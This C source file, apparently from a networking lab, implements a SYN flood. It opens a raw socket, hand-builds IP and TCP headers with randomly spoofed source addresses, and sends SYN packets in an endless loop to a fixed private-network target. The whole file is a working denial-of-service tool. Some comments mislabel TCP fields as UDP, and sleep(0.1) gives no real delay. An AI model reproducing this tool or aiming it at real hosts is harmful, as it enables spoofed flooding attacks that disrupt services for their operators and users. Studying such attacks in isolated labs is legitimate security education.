/*
 * syn_flood.c
 *
 *  Created on: May 4, 2016
 *      Author: jiaziyi
 */


#include<stdio.h>
#include<string.h>
#include<sys/socket.h>
#include <unistd.h>
#include<stdlib.h>
#include<netinet/in.h>
#include<arpa/inet.h>
#include "header.h"

#define SRC_PORT 2000

#define DEST_IP "192.168.56.101" 
#define DEST_PORT 2000 

int send_syn(int fd, char *ip); // Declare function before use

struct sockaddr_in source,dest;
FILE *logfile;

int main(int argc, char *argv[])
{
	int fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    int hincl = 1;                  /* 1 = on, 0 = off */
    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &hincl, sizeof(hincl));
	if(fd < 0)
	{
		perror("Error creating raw socket ");
		exit(1);
	}

	printf("Socket created\n");


	char ip[16];

	while(1) {

		int a = rand() % 150;
		a +=20;
		int b = rand() % 256;
		int c = rand() % 256;
		int d = rand() % 256;
		
		sprintf(ip, "%d.%d.%d.%d", a, b, c, d);

		if(send_syn(fd, ip) < 0)
		{
			perror("Send failed");
			exit(1);
		}
		printf("Packet Sent from ip: %s\n", ip);
		sleep(0.1);
	}

	
	return 0;

}

int send_syn(int fd, char *ip) {
	char source_ip[16];
	char dest_ip[] = DEST_IP;
	//memcpy(source_ip, "192.168.56.1", sizeof(source_ip));
	snprintf(source_ip, sizeof(source_ip), "%s", ip);

	printf("Source IP: %s\n", source_ip);	
	char packet[65536], *data, pseudo[65536];
	memset(packet, 0, 65536);

	//IP header pointer
	struct iphdr *iph = (struct iphdr *)packet;

	//TCP header pointer
	struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));
	struct pseudo_tcp_header psh; //pseudo header

	//data section pointer
	data = packet + sizeof(struct iphdr) + sizeof(struct tcphdr);

	//fill the IP header here
	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0;
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
	iph->id = htons(54321); //Id of this packet
	iph->frag_off = 0;
	iph->ttl = 255; //Time to live
	iph->protocol = IPPROTO_TCP; //UDP protocol
	iph->saddr = inet_addr(source_ip); //Source IP address
	if (iph->saddr == INADDR_NONE) {
		fprintf(stderr, "Invalid IP address: %s\n", source_ip);
		return -1;
	}
	iph->daddr = inet_addr(dest_ip); //Destination IP address
	iph->check = 0;
    iph->check = checksum((unsigned short *)packet, sizeof(struct iphdr)); //IP checksum
    //print_ip_header(packet, iph->tot_len); //print the packet
    //print_ip_header(packet, iph->tot_len); //print the packet

    //printf("IP checksum: %x\n", iph->check);

	//tcp psh
	psh.source_address = inet_addr(source_ip); //Source IP
	psh.dest_address = inet_addr(dest_ip); //Destination IP
	psh.reserved = 0;	
	psh.protocol = IPPROTO_TCP; //TCP protocol
	psh.tcp_length = htons(sizeof(struct tcphdr)); //UDP length


	tcph->source = htons(SRC_PORT); //Source port
	tcph->dest = htons(DEST_PORT); //Destination port
	tcph->seq = htonl(0); //WHY???
	tcph->ack_seq = 0;

	tcph->res1= 0;
	tcph->res2= 0;
	tcph->doff = 5; //tcp header size
	tcph->fin = 0;
	tcph->syn = 1; //SYN flag
	tcph->rst = 0;
	tcph->psh = 0;
	tcph->ack = 0;
	tcph->urg = 0;
	tcph->window = htons(5840); 
	tcph->urg_ptr= 0;
	tcph->check= 0;
	memcpy(pseudo, (char *)&psh, sizeof(struct pseudo_tcp_header)); //pseudo header
	memcpy(pseudo + sizeof(struct pseudo_tcp_header), tcph, sizeof(struct tcphdr)); //tcp header + data
	tcph->check = checksum((unsigned short *)pseudo, sizeof(struct pseudo_tcp_header) + sizeof(struct tcphdr)); //TC* checksum

	//print_tcp_packet(packet, sizeof(struct tcphdr)); //print the packet

	//printf("UDP checksum: %x\n", tcph->check);
	//send the packet
	dest.sin_family = AF_INET; //IPv4
	dest.sin_port = htons(DEST_PORT); //Destination port
	dest.sin_addr.s_addr = inet_addr(dest_ip); //Destination IP address
	
	if(sendto(fd, packet, iph->tot_len, 0, (struct sockaddr *)&dest, sizeof(dest)) < 0)
	{
		perror("Send failed");
		return -1;
	}
	return 0;

}
